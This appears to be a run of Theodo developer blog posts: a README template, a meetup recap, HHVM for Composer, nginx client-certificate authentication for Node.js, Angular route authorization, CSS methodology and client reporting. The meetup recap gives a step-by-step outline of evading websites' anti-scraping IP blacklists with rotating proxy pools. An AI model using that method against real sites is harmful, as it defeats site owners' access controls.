As a result, I began building a README template, that could help us structure our knowledge on projects in a unified and accurate way, for any kind of technology we are working on. The aim was to have a simple, yet exhaustive list of what we need to know in our daily developer lives. We’ve been using it for a while on many projects. After some field testing and improvements, it’s now time to share it with the world! 
What does the README say? (Ring-ding-ding-reding…)
There is a dedicated GitHub repository with this documentation template, that you can immediately clone in order to start coding inside. It has been designed out of a Symfony2 project, so you might notice some familiar Symfony commands used as examples, but this README template is fully technology-agnostic, so you can use it whether you are working in Javascript, Ruby, PHP or any other swaggy language.

As I told you before, the “frontpage” (I mean the README.md) of this documentation contains only the name of the description of the repository, plus a list of sections… Oh, and we also included the name of the people who contributed to the project. And this is actually a really important part you should not forget! Believe it or not, human beings are the best source of information (true story). That’s why you should always keep in mind (and in your README) who worked on each project, in case you need a hand to solve a tenacious bug. Regarding Theodo projects, we split the team according to the role of each person, so we added our Scrum Master and our sales person for each project.
The main sections of your documentation
Then, let’s talk about the different divisions in our documentation. Each time I struggled on a project, I tried to understand what was blocking me; I ended up categorizing the problems into six sections:

Installation: This is where you explain how to install your project. The shorter, the better: a good project requires only a few commands to be installed and any sophisticated operations should be bypassed automatically. You may add a “Troubleshooting” part in this section if you think it would be useful.
Data model: An important, but most of the time neglected section. Help your new teammates understand what is the application they are about to work on, by describing the data model, potentially the database schema involved. Feel free to describe the real meaning of the objects and classes of the project, as the most technical projects handle real-world items.
Database: This section is intended for explaining how to get fresh data, in case your project is data-oriented. Whether you use fixtures, database dumps or SQL batches, describe here how your developers can fill in their local environments with fresh data.
Provisioning: Describe here how to update your servers with additional packages. Feel free to explain as well how to correctly manipulate provisioning files, if there are some subtleties in the way your provisioning works.
Git Worklow: Pretty straight-forward title. Explain which branch should be rebased and where you should merge your feature before deploying.
Environments: A crucial part as well, you should first give the list of your different environments, with additional information such as the URL, the related Git branch, etc. Finally, explain how to deploy on each environment.

Obviously, this structure is completely flexible: feel free to add any relevant section (or remove any irrelevant one), based on your project, its technologies, and more important: its team!
Conclusion
I hope this README template will help you organize and clarify information in all your projects! Please contribute to the README template repository through pull requests or issues.
And remember: a good documentation should stay simple and go straight to the point. Don’t flood your README with thousand of sections, or your coworkers won’t read any of them! As Saint-Exupéry said:
Perfection is achieved, not when there is nothing more to add, but when there is nothing left to take away.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Kenny Durand
  			
  				  			
  		
    
			

									"
"
										Last week, Theodo was at the Human Talk Meetup.
It’s a small afterwork event where developpers speak without restrictions about any topic during 4 sessions of 10 minutes each. Each talk was really really interesting and the subjects were quite diverse. Therefore I will dedicate one paragraph to each talk of the evening.

Object Oriented Programming: historical error or path to follow?
This session, presented by Frédéric Fadel, was of particular interest for me, for it smartly challenged our standardized vision of programming. Why do we use OOP? Mainly for historical reasons, but there are lots of things that we do for historical reasons, that are now standards, but are we sure it is the right choice? Democracy, Capitalism, Monogamy, Obligation of School… who knows if other standards will emerge tomorrow?
Therefore he questioned the pertinence of 3 fundamentals of OOP: encapsulation, polymorphism and heritage. Whereas he totally agrees with the first concept and find that the second can be useful too, he mainly criticizes the last one. Because of the true nature of information, completely virtual, it is by essence very difficult to model into labeled boxes and fixed objects. His speech is therefore a curiosity incentive to make you want to learn more about Aspect Oriented Programming.
As I do not intend to rephrase the talk here, if you want to know more, I invite you to watch the full video of the presentation.
Presentation of Scrapoxy
This session was less philosophical and more pragmatic as it went straight into the methods of bypassing web scrapers limitations. After a short introduction about what is at stake (getting information and resell it :p), Fabien Vauchelles enumerated the 3 main restrictions companies put in place to limit the scrapping.
The first limitation is simple blacklisting based on IP and hits per minute. The second one is advanced blacklisting based on more complex detection techniques (User-Agents or even user behavior: how does a human user use the keyboard, the mouse…). The third one often comes into play when a strange behavior is detected: the website asks the user to confirm that he is human with a captcha.
He then reasoned step by step on how to bypass the first limitation:

Step 1: you use a proxy to hide your IP. When it is blacklisted, you can restart manually the proxy to scrap the website with a new IP.
Step 2: you use many proxies with many IPs to gain more time before you get detected
Step 3: you use a proxy manager that will manage a pool of proxies. Detect automatically which ones have been blacklisted, exclude them of the pool and start a new one, to keep the number of proxies constant.

Which is the exact behavior of Scrapoxy.
Of course, the last question of the public was about the morality of web scrapping… Well, you can still visit their website or watch the video if you want to learn more!

Why do we fix bugs?
The speaker, Michal Švácha, was truly enthusiast and inspiring during this recreative presentation. He fitted perfectly in between the more technical presentation with a lot of humor. After an epic bug resolution description, he asked himself this simple question: “why do we fix bugs?”.
He ran through every possible reason:

Is it for our brain to feel better?
To please our product manager?
For the end-user at world’s end?
For the pleasure to tick one more bug in our todo-list?

He finally ran into the conclusion that we are human after all and that we are mainly doing it to gain experience, to be better programmers, for our thriving thirst of personal progress and accomplishment. Actually fixing bugs is not about the destination, it is about the journey.
If you want the whole show, here is a link to the online video.
ReactJS in production
The last presentation, by Clément Dubois was about ReactJS, used on the Chilean website of Club Med. The main reason behind this bold technology choice was the need of SEO on a single page application. Indeed, single page apps are mainly blanks for search engines because they build the DOM dynamically depending on AJAX sub-requests results. With ReactJS, you can configure your server to send first a static and full version of the page, understandable by search engines. The JavaScript then makes it dynamic, as a real web application. He went through the basics of ReactJS (the components, the state and the render function), including code snippets. He also explained the necessity in their process to begin with finding the components that you will need to create in a page and see which generic version you can write for later reuse.
If you are interested, I invite you to learn more about ReactJS in their really useful documentation, or on the video of the presentation.

Well, if you’re interested in these topics, it would be a pleasure to meet you in one of the nexts Human Talk meetups! See you on October 13?

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Reynald Mandel
  			
  				After two start-ups creations in web & photography, Reynald joined Theodo to sharpen his skills in Symfony2 and in development in general. As an architect-developper and coach, he helps the teams & the clients to succeed in their projects and use the best practices both in code and agile methodology.  			
  		
    
			

									"
"
										
Hello my dearest Mac geeks!
A long long time ago, Facebook released a shiny machine named HHVM.
It could execute PHP very fast and was compatible with Mac OS X.
Time has passed, HHVM was still incredibly fast, but lost its compatibility with Mac.
A few days ago, after 2 years of intense work, a (too discreet in my opinion) announcement popped:
Awesomeness was back.
You can now (again) install HHVM on your Mac very easily with Homebrew thanks to this official repository:
brew tap hhvm/hhvm
brew install hhvm

A warning though, installation takes a long time (as in “can take more than 1 hour on slow computers”).
Awesome! Wait, what do I need HHVM for again?
Who has never had any performance problem with Composer?
Infamously, the composer update command can be very slow and eat a lot of memory if you have quite a few dependencies, which is often the case on a Symfony project.
I ran out of memory several times because of it, generally after a few minutes of intense computation.
Situation is considerably better than in the past thanks to some incredible tricks like this one.
And yet, 2GB of RAM is rarely sufficient, and it still takes more than 5 minutes on some computers to update the configuration.
First thing to speed up composer:
if you work in a virtual machine with file sharing with your Mac (with Vagrant for example), you should not try composer update inside the machine, but in your Mac.
That leads us to HHVM:
hhvm $(brew --prefix)/bin/composer.phar update

should rock your world on your Mac!
Don’t like to type all this gibberish?
Make it an alias.
For bash for example, add this to your .bash_profile:
alias hcomposer='hhvm $(brew --prefix)/bin/composer.phar'

Another warning, when updating outside your environment with either your Mac PHP or HHVM, you should use the option --ignore-platform-reqs to ignore the version differences in PHP and the extensions.
Benchmark with “oldie” PHP 5.6.12 on a naked Symfony Standard Edition (on a quite newish MacBook Pro, so it’s still really fast):
composer update --profile
[8.0MB/0.07s] Loading composer repositories with package information
[8.4MB/0.20s] Updating dependencies (including require-dev)
[367.7MB/14.71s]   - Installing symfony/symfony (2.8.x-dev 685a1cf)
[367.7MB/14.71s]     Cloning 685a1cf6f441459fb61a25acfe93853d016f46c2
…

With shiny bleeding edge HHVM:
hcomposer update --profile
[8.0MB/1.16s] Loading composer repositories with package information
[8.0MB/1.64s] Updating dependencies (including require-dev)
[126.0MB/5.66s]   - Installing symfony/symfony (2.8.x-dev 685a1cf)
[126.0MB/5.84s]     Cloning 685a1cf6f441459fb61a25acfe93853d016f46c2
…

Now, your biggest problem will be finding a way to spend all this free time left for you.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Tristan Roussel
  			
  				After graduating from l'École Normale Supérieure in mathematics, Tristan explored various jobs: trading, theoretical research in computer science, data analysis and business development. He finally found his way at Theodo in 2013 as a web developer-architect. He works mainly with Symfony and front-end JavaScript frameworks, and is particularly fond of git.  			
  		
    
			

									"
"
										The problem we had
We had to secure some routes of our Node.js API so only trusted servers could call them.
There are others solutions to do so, but for this project we had to do it using SSL client certificates.
We followed the really nice tutorial from Nate Good that explained how to do it with nginx and FastCGI.
I decided to do a similar tutorial for nginx and Node.js.
The following will help you build the same thing in your development environment.
If you don’t really know how nginx works, have a look at my blog post about the basics of nginx.
The certificates
First you need to create a CA key. What’s a CA? Let’s ask wikipedia:
In cryptography, a certificate authority or certification authority (CA) is an entity that issues digital certificates.
This key will be used to sign client or server certificates. Signing a certificate is a way to say “I trust” this client or server.
# Create the CA Key and Certificate for signing Client Certs
openssl genrsa -des3 -out ca.key 4096
openssl req -new -x509 -days 365 -key ca.key -out ca.crt

Then you can create your server and client certificate.
# Create the Server Key, CSR, and Certificate
openssl genrsa -des3 -out server.key 1024
openssl req -new -key server.key -out server.csr

# Create the Client Key and CSR
openssl genrsa -des3 -out client.key 1024
openssl req -new -key client.key -out client.csr

Finally, you can sign your certificates with the CA you just made.
# We're self signing our own server cert here.  This is a no-no in production.
openssl x509 -req -days 365 -in server.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out server.crt

# Sign the client certificate with our CA cert.  Unlike signing our own server cert, this is what we want to do.
openssl x509 -req -days 365 -in client.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out client.crt

When you create your Certificate Signing Request (CSR), your web server application will prompt you for information about your organization
and your web server.
This information is used to create the certificate’s Distinguished Name (DN) allowing you to know which client is doing the request.
In our case, the client is a server we trust.
The nginx configuration
Here is a working nginx conf
server {
        listen 8443;
        ssl on;
        server_name node-protected-app;
        #Classic part of ssl
        ssl_certificate      /var/www/server.crt;
        ssl_certificate_key  /var/www/server.key;

        #Here we say that we trust clients that have signed their certificate with the CA certificate.
        ssl_client_certificate /var/www/ca.crt;
        #We can choose here if we allow only authenticated requests or not. In our case it's optional
        ssl_verify_client optional;

        location / {

                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

                #If the client certificate was verified against our CA the header VERIFIED
                #will have the value of 'SUCCESS' and 'NONE' otherwise
                proxy_set_header VERIFIED $ssl_client_verify;
                #If you want to get the DN information in your headers
                proxy_set_header DN $ssl_client_s_dn;

                proxy_pass http://127.0.0.1:3000;
        }
}

Using restify
Finaly here is a short implementation using restify in CoffeeScript:
restify = require 'restify'

exerciseApi = restify.createServer(
  name: 'nginx-exercise'
)

# API Routes
exerciseApi.get '/', (req, res) ->
  res.send 'Hello from the api'

# API Routes
exerciseApi.get '/protected-route', (req, res) ->
  console.log req.headers
  return res.send(401) if req.headers.verified isnt 'SUCCESS'
  res.send 'This is a serious content'

exerciseApi.startServer = (port = 3000, callback) ->
  console.log ""Starting server on port ""+port
  exerciseApi.listen port, callback

exerciseApi.startServer()

It’s very simple, we just have to check the header to allow or not the request.
I have updated my nginx sandbox, if you want to try all of this
in a clean environment.
If you do so, inside the Vagrant you can test with cURl that your API is behaving as expected:
curl -k --key client.key --cert client.crt https://localhost:8443/protected-route

Using loopback
Let’s imagine you have a model with a dogs entity.
If you want to allow some specific actions to be done only by a trusted client, you can do the following:
//common/models/dogs.js
module.exports = function(Dogs) {
  Dogs.beforeRemote('upsert', function(ctx, instance, callback) {
    console.log(""headers"", ctx.req.headers);
    console.log(""verified"", ctx.req.headers.verified);
    //Here you can test the headers
  });
};

Let’s say that you have the following dog.json fixture file like:
{
  ""name"": ""Pluto"",
  ""owner"": ""Mickey""
}

You can simulate an upsert with:
curl -X PUT -F ""metadata=<dog.json;type=application/json"" https://127.0.0.1:8443/api/dogs --key client.key --cert client.crt -k

SSL inside Node.js
Node can run a web server. It’s also possible to use SSL and SSL client authentication directly with Node.js.
There is another blog post from Nate Good about it.
An issue you could encounter with cURL
On our project, we had some problems using curl with the certificates. We ended up making our tests with httpie which is also a nice tool.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										
Supercharging AngularUI Router with basic route authorization features
AngularUI Router is undoubtedly the routing framework to use when working on any Angular application that requires the slightest routing features. It allows organizing your different (and possibly nested!) views into a state machine, with each state optionally attached to routes and custom behaviors.
However, when some routes require in your application for the user to be logged in or to possess any kind of authorization, you may find yourself having to reinvent the whole wheel to allow such restrictions.
In this blog post, I will introduce a very basic, yet functional, way to:

Limit access to states
Redirect users to another state when access was denied
Memorize the state the user was trying to reach, in order to allow redirection as soon as the user successfully logs in

Always keep in mind that client side authentication, although improving the user experience, does not replace the more secured server side authentication which should always be implemented first when security is a concern.
Reading this article requires a basic understanding of AngularJS, AngularUI Router, and of Lodash.
The sample app state machine
We introduce a minimum example, with an application with four routes, two of which being restricted and being given the authorization flag as well as a redirectTo option to specify where the user should be redirected if not authorized. An additional memory flag is given to the ‘secret’ state in order to specify that the fact that the user was trying to reach this state should be memorized.
.config(function ($stateProvider, $urlRouterProvider) {

  $urlRouterProvider.otherwise('/');

  $stateProvider
  .state('home', {
    url: '/',
    template: '<h1>Home</h1>'
  })
  .state(""login"", {
    url: ""/login"",
    template: '<h1>Log In</h1>'
  })
  .state('private', {
    url: '/private',
    template: '<h1>Private</h1>',
    data: {
      authorization: true,
      redirectTo: 'login'
    }
  })
  .state('secret', {
    url: '/secret',
    template: '<h1>Secret</h1>',
    data: {
      authorization: true,
      redirectTo: 'login',
      memory: true
    }
  });

});

The Authorization service
This service must include a boolean determining wether or not the user is currently authorized to access restricted routes, as well as which state the user was last trying to reach.
It also provides a function to clear both information, as well as a go method which is to be called when the user logs in with success. It authorizes the user, and also performs a $state.go, except that it tries to use the memorized state if available, relying on the given state fallback argument if not.
.service('Authorization', function($state) {

  this.authorized = false;
  this.memorizedState = null;

  var
  clear = function() {
    this.authorized = false;
    this.memorizedState = null;
  },

  go = function(fallback) {
    this.authorized = true;
    var targetState = this.memorizedState ? this.memorizedState : fallback;
    $state.go(targetState);
  };

  return {
    authorized: this.authorized,
    memorizedState: this.memorizedState,
    clear: clear,
    go: go
  };
});

Logging in can then easily be done by calling this method, which authorizes the user, and redirects him to the private state, or to any memorized state if it does have one.
Authorization.go('private');

Logging out is just as easy, and can be followed by a redirection to a non restricted state.
Authorization.clear();
$state.go('home');

In most cases, you will want to hold the authorization information in the local storage, so that the user stays logged in even after restarting the browser.
Restricting access
The first step is to restrict access to the states which were given the authorization flag. Let’s work step by step in a angular run block:
.run(function(_, $rootScope, $state, Authorization) {

  $rootScope.$on('$stateChangeSuccess', function(event, toState, toParams, fromState, fromParams) {
    if (!Authorization.authorized && _.has(toState, 'data.authorization') && _.has(toState, 'data.redirectTo')) {
      $state.go(toState.data.redirectTo);
    }
  });
});

We listen to the $stateChangeSuccess event, to allow a possible resolve block for the target state to be processed. We then redirect the user to the redirectTo state name.
Setting the memorized state
In order to use the Authorization.go function which tries to redirect the user to the memorized state, such a state needs to be set in the run block as well. Here is an updated version where such a feature is applied to each state given a truthy memory in the state configuration.
.run(function(_, $rootScope, $state, Authorization) {

  $rootScope.$on('$stateChangeSuccess', function(event, toState, toParams, fromState, fromParams) {
    if (!Authorization.authorized && _.has(toState, 'data.authorization') && _.has(toState, 'data.redirectTo')) {
      if (_.has(toState, 'data.memory') && toState.data.memory) {
        Authorization.memorizedState = toState.name;
      }
      $state.go(toState.data.redirectTo);
    }
  });

});

Forgetting about the memorized state
With the simple implementation, some issues may arise when the user does not choose to immediately log in after being redirected, and moves instead to another non-restricted state. The proper behavior would then be to forget about the memorized state, so that when the user eventually logs in, the fallback state parameter given to the Authorization.go is used instead. Here is the final version of the run block.
.run(function(_, $rootScope, $state, Authorization) {

  $rootScope.$on('$stateChangeSuccess', function(event, toState, toParams, fromState, fromParams) {
    if (!Authorization.authorized) {
      if (Authorization.memorizedState && (!_.has(fromState, 'data.redirectTo') || toState.name !== fromState.data.redirectTo)) {
        Authorization.clear();
      }
      if (_.has(toState, 'data.authorization') && _.has(toState, 'data.redirectTo')) {
        if (_.has(toState, 'data.memory') && toState.data.memory) {
          Authorization.memorizedState = toState.name;
        }
        $state.go(toState.data.redirectTo);
      }
    }

  });
});

The tricky part is that clearing the memorized state should only be done when the user moves away from the login page, and thus should not be cleared when toState.name !== fromState.data.redirectTo.
Demo / Library
A simple demo is given in this Codepen.
You can navigate between the four states, the two first of which not requiring being authentified. Trying to reach the ‘Private Page’ or the ‘Secret Page’ will redirect you to the ‘Login’ state.
By default, logging in will get you to the ‘Private Page’, but if you log after trying to reach the ‘Secret Page’, you will be redirected to it directly.
I’ve provided an implementation of this system in the angular-authorization repository on GitHub. It probably has issues, so any feedback, bug reports, feature requests, or pull requests are more than welcome !
____
You liked this article? You’d probably be a good match for our ever-growing tech team at Theodo. Take a look at our job offers on http://www.theodo.fr/en/joinus/

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Woody Rousseau
  			
  				Woody is a full-stack web developer, who believes in building complex applications, with a focus on speed without compromising code quality. He also loves adding  as many Github badges as possible on his repositories.  			
  		
    
			

									"
"
										CSS coding should not be a pain in the neck. At some point, most developers notice that they avoid writing CSS and that it has an impact on their efficiency and on the code quality, which is unacceptable.
It recently happened to me so I decided to tackle this issue. I stopped, took a deep breath and I dived, crawling the Internet looking for a solution.
I eventually found one, and I never despised CSS ever since.
In fact, I rewrote the entire CSS stylesheet of my main personal project (its design is entirely custom) and I achieved a 50% drop in CSS lines count and number of classes, in addition to increasing maintainability, reusability and code quality.
In this article, I will cover these subjects:

Why CSS is important
How to avoid common mistakes
How to structure your code with the OOCSS and BEM methodologies
Which best practices I used and I recommend

This article will serve you well if you code your CSS from scratch but it will also help you if you use frameworks like Bootstrap (let’s face it, you can not do everything with a styling framework). I assume that you are using a preprocessor so the LESS syntax will be used in the examples.
Why you should care about CSS
CSS with preprocessors like LESS and SASS is a great tool. But remember: “With great power comes great responsibility”. Having powerful tools like design patterns and awesome frameworks does not mean you will use them without running into trouble. Doing bad, bad, bad things is super easy with CSS and preprocessors. Even if you say “ok, this time I will do it better”, if you do not have some quality standards you will keep writing messy CSS. Let’s see why:

Like any language, CSS should be reusable, maintainable and scalable. Adding CSS properties on top of each other in order to fix a problem will break these three rules.
Ever seen plentiful padding/margin/color declarations in every CSS class? You know what I’m talking about. Code should not be duplicated.
Ever used !important because you needed it to fix a previously applied CSS rule? You know it’s wrong. Why are you still doing it? Fix the problem at the source.
Keeping your specificity low (we’ll talk about it later) will speed up CSS rendering and maintainability.

Dealing with selectors
First of all, you must have a good understanding of what specificity is. Here is a nice definition :
Specificity determines which CSS rule is applied by the browsers. If two selectors apply to the same element, the one with higher specificity wins.
The rules to win the specificity war are:

Inline style beats ID selectors. ID selectors are more specific than classes and attributes (::hover, ::before…). Classes win over element selectors.
A more specific selector beats any number of less specific selectors. For instance, .list is more specific than div ul li.
Increasing the number of selectors will result in higher specificity (.list.link is more specific than .list).
If two selectors have the same specificity, the latest declared rule wins.
!important overrides normal declarations, duplicating all specificity levels, leading to eight categories in the selectors hierarchy.

Here is a good website to compute the specificity of a selector: Specificity Calculator. Try it with your own selectors! Now that we fully understand specificity, here are some best practices:
Have decoupled selectors
Separating your selectors is a good idea. For instance, if you have this markup:
<div class=""alert danger"">...</div>

You should style it with:
/* GOOD */
.alert {
    font-weight: bold;
}
.danger {
    color: red;
}
/* BAD */
.alert.danger {
    font-weight: bold;
    color: red;
}

Decoupling selector will not only increase maintainability and scalability: it will speed up the rendering. Most web browsers are caching first-level selectors. .alert and .danger will be cached but not .alert.danger!
Keep your specificity low
In short, avoid downward selection like hell. With a sufficient amount of CSS, you would end up using inline styles. For instance, this is a very bad selector:
#hellobar a.hellobar_cta.hb-button {}

In addition to the non-meaningful class names, how would you overwrite a rule set by this selector? Using !important, inline style or just another class, maybe?
To avoid future complication and refrain your inclination to go down in the specificity hell, you should follow these rules:

Use only classes. If you limit yourself to classes you will never dig that deep. The first thing that you learn in CSS is: “never do inline style”. Same here.
Never use !important to go downward. The only correct way to use !important is to ensure upward specificity. Here is a good example: danger should always be red, no matter what happens.

.danger { color: red !important; }

Don’t mess with HTML or Javascript
Every language exists for a reason and is an autonomous, meaningful entity.
CSS is for styling. HTML is for meaning. Javascript is for manipulation.

Never style IDs. It is too specific and impossible to reuse. IDs should only be used as anchors or as Javascript selectors.
On the contrary, you should never use classes as Javascript selectors, because that would mean that you couldn’t reuse a CSS class. Use IDs or data-attributes instead.
Never style HTML elements. For me, that was the hardest part of the learning curve because it went against everything I had done before. HTML should be meaningful: using a DOM element for styling is a bad practice. Imagine you had a .clickable class which displays a specific color and a custom pointer on hover. You could apply it like this:

<a class=""clickable""></a>
<li class=""clickable""></li>
<tr class=""clickable""></tr>
<h3 class=""clickable""></h3>

This is particularly useful for single page apps using custom routing links or for a resource that is accessible on click, without page change. If you have a user input (like a text coming from a WYSIWYG textarea), consider making an exception:
.user-input {
    a { .clickable; }
    h1 { .big; }
    kbd { .code; }
}

It is also a good practice to write style-first DOM. Provided you have a nice grid system (flexbox is great), you might consider ordering your properties like this:

Grid-related attributes.
Classes (with two white spaces between each class for better readability).
HTML attributes.
Other custom attributes.

For instance, if I have an AngularJS app:
<a flex=""50"" class=""btn  btn-default"" href=""..."" title=""..."" ng-if=""...""></a>

The first step to heaven: OOCSS
If there is one word to describe OOCSS, it is reusability. What is OOCSS?
OOCSS means Object-Oriented CSS. The goal is to find repeated visual patterns and to factorize them when possible. .big-title is better than .main-title while .links-list is prefered to .articles-menu.
Bootstrap was the first great impulsion towards OOCSS. See for yourself:
<a class=""btn  btn-default  btn-lg""></a>

Some properties are factorized in the .btn class, reducing code size and speeding up rendering.
But OOCSS have some downsides: sometimes the need is too specific, you can’t address with factorized objects. For instance, building a monolithic web app with an original design is merely impossible with OOCSS only.
Furthermore, it is very difficult to foresee what piece of code will be reused because OOCSS relies on visual patterns and you don’t have any when starting a web app from scratch.
The BEM structure
BEM is a method published in 2010 by Yandex. It means Block Element Modifier. It relies on the fact that every web page or web app can be exploded into blocks, elements and modifiers.
The BEM syntax is a bit specific. The official naming convention is:
.block {}
.block--modifier {}
.block__element {}
.block__element--modifier {}

Here is a short example which sums up the entire BEM concept:
.Person {}
.Person--blind {}
.Person__head {}
.Person__hand {}
.Person__hand--left {}
.Person__hand--right {}

(I like to start class names with a capital letter because it ensures that the name is not already in use by a vendor like Bootstrap)
BEM Blocks
A block is an autonomous entity, a component of the web app. An app can be represented as as Block Tree. For instance, here is an excerpt from the official BEM website:

A block can even be reused across websites and most of all it has its own context. Which means that higher or lower blocks in the Block Tree will not affect the display of the current block.
To achieve this, positioning rules and BEM blocks should be totally decoupled. A Block class should not contain rules such as float, margin or width.
The main advantage of this is that blocks can be moved across the website without worry. An interesting property is that, as a consequence, blocks can be included recursively. Imagine building a Reddit-like comment tree:
<div class=""CommentBox"">
    [... Text ...]
    <div class=""CommentBox"">
        [... Text ...]
        <div class=""CommentBox"">
            [... Text ...]
        </div>
    </div>
    <div class=""CommentBox"">
        [... Text ...]
    </div>
</div>

If blocks and positioning rules are properly decoupled, you win!
This is particularly powerful when used in combination with components-based frameworks: AngularJS directives, ReactJS components…
BEM Elements and Modifiers
An element is a part of a block. Thus it uses the block context. That’s why there is a reminder before the element name:
.block__element {}

Blocks being autonomous entities, elements can and should be positioned inside them. Modifiers are classes used to propose alternative versions of a block or an element. The following example could be described by this markup:
<nav class=""Navbar"">
    <a class=""Navbar__tab"">Tab 1</a>
    <a class=""Navbar__tab"">Tab 2</a>
    <a class=""Navbar__tab  Navbar__tab--active"">Tab 3</a>
    <a class=""Navbar__tab"">Tab 4</a>
</nav>


Preprocessors are really useful:
.Navbar {
    ... rules ....

    &__tab {
        ... rules ....

        &--active {
            ... rules ....
        }
    }
}

Elements can also be positioned blocks:
<div class=""Search"">
    <input class=""Search__input  Input"">
    <button class=""Search__button  Button""></button>
</div>

Suggested CSS architecture
Now that you have all of this in mind, how to structure your CSS (or LESS/SASS files)? There is no absolute guideline but here is a suggested file tree:
style
├── bootstrap.less
├── components
│   ├── button.less
│   ├── link.less
│   ├── navbar.less
│   └── ...
├── objects
│   ├── colors.less
│   ├── grid.less
│   ├── typo.less
│   └── ...
├── resets
│   ├── fonts.less
│   ├── html.less
│   ├── vendor.less
│   └── ...
└── themes
    ├── theme1.less
    ├── theme2.less
    └── ...


If you consider theming (theme files defining colors then including the bootstrap file), your favorite build system could build all files in the themes folder into separate minified CSS files. If theming is not important, you can delete this folder and directly build the bootstrap file.
The bootstrap file should load the resets then the objects then the components.
Reset files are here to wipe out unwanted styling such as text-decoration on links, title margins or vendor classes.
Objects are OOCSS classes and mixins reusable everywhere: .small, .big, .padded… with this you could unify all your padding values, your font sizes etc.
Components are entire BEM contexts: blocks with their elements and modifiers.

With this you could easily reuse bits of code and components for your other websites. Creating your own styling framework is at a hand and it is not that difficult!
Conclusion
With OOCSS and BEM, I began to enjoy CSS. Before, it was more a drudgery than anything else.
With OOCSS and BEM, the code is more structured, reusable, and you have that feeling that you’re doing it right. Which is in my opinion the most important thing because you will be more efficient and produce better quality code.
Sources and inspirations:

This excellent and striking presentation tackling our styling methods
An article on CSS specificity
The official BEM documentation
Material Design Lite, if you want to check out an implementation of BEM


You liked this article? You’d probably be a good match for our ever-growing tech team at Theodo. Take a look at our job offers on http://www.theodo.fr/en/joinus/.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Albéric Trancart
  			
  				Albéric Trancart is an agile web developer at Theodo. He loves sharing what he has learnt and exchanging with great people.  			
  		
    
			

									"
"
										Who is your client?
In every professional relation, you have a provider and a client. Whether she’s your boss or the head of a company you’re dealing with, the client is the one you are creating value for and she is the one you want to bring onboard.
At Theodo we help our clients to solve their business problems with code. It is crucial to us that the people at the company we work with – who often don’t get anything about coding – understand our progress towards the goal we determined together. Which means we need to make visible to them the value we add.
Ideally, we’d work side-by-side with our clients. They’d see us working and we’d show them our deliverable right when we are done. Unfortunately, although they are the ones with the business vision, they’re never full time on our project and tend to be busy with other subjects. As for technical teams, the complexity of our topic makes it even harder to keep them onboard.
So we asked ourselves how to provide transparency to our clients and came out with a powerful tool.
First, what do we need?
We agreed on 4 criteria:

easy to get and targeted: decision-makers are busy people. They want straight-to-the-point info. No noise. With the most important information made blatant.
understandable for outsiders: your clients have providers themselves and they need to report to someone as well. They need jargon-free reports they can transmit to their clients.
daily-basis: to maintain contact and allow to be reactive in case of problem.
easy and fast to produce: transparency is essential for the success of a project but is not an end in itself. The time to write this report should not spill over your work. The maximum timebox for this exercise should be 15 minutes. Done is better than perfect.

Second, what do we do?
Let us introduce you to The Theodo Daily Mail™.
It’s a simple and short document with key characteristics:

The short-term objective set for your team (i.e. number of sales completed during a month, number of recruitments achieved, features developed, etc.)
One key metric updated on a daily-basis (and presented in a visual manner)
A check on the goals your team committed to the day before
A forecast of the goals you want to reach today
A list of the problems you’re facing and the actions you plan on taking to solve them


In addition, here are 2 pieces of advice we’d like to share: keep your style sober and be precise.
Colors need to be meaningful: use colors as signals, and keep them seldom. At Theodo, for instance, we agreed that we only needed green and red to highlight whether we reached our goals for the day before or not. Same for fonts, sizes and decoration: if you’re going to use them, make sure they help understand your message better, otherwise they add nothing but noise.
Most importantly, be accurate in your report. Precision is key: use actual facts (how many sales appointments did you get?, how many applicants did you meet?, what functionality exists today that didn’t yesterday?). And please, write sentences with action verbs, active forms and check dates. Especially when it comes to problem-solving. Instead of writing “the last functionalities need to be validated”, prefer “Steve, can you validate that the signup form we developed works? We’ll make a check at 3pm today”. 
After months of experimentations, here’s what we’ve learned.
So, third,what’s the outcome?
Our Daily Mail was meant to solve the transparency issue (“how do I show the value I create for my client”) and here are two examples of feedbacks we got.
I had no idea of what you (the IT team) were doing, now it’s super clear. I know exactly what to expect today. Thanks.Yahya Tahri, Product Strategy Manager BNP Paribas Investment Partners
I forwarded it to the head of IT of my main investor to show them our progress.The CEO of a cool start-up we worked for
We realized that not only we managed to give more information to our interlocutors and create trust but we also gave them a tool to communicate with their own clients. Digging deeper, we realized that there were other unexpected advantages to our Daily Mail. Here is what we found:

Writing a Daily Mail makes you ask yourself consistent questions everyday. It brings discipline to yourself and the team. It forces you to formulate problems you encounter and track the effect of the actions you take. In other words it helps you begin a continuous improvement process.
With Daily Mails, teams share indicators to communicate their progress towards measurable goals. But the report itself is an indicator of the team’s motivation: motivated teams write efficient and meaningful Daily Mails. If the reports you get don’t match the 4 criteria we listed above, you should see that as a problem and take actions to react.
When you set daily goals, you commit yourself to them. It reinforces your engagement to make the team and the project succeed.

Let’s keep going
At Theodo we are strong Scrum advocates. As praised by the very official Scrum Guide, we believe that Transparency, Inspection and Adaptation are key pillars to help teams improve continuously and eventually succeed in their projects. We found that writing Daily Mails was instrumental in implementing such a process within development teams.
The Theodo Daily Mail™ is one version of this virtuous report we tried to define. It’s still a work in progress and we’d be happy to have your feedback to improve it.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
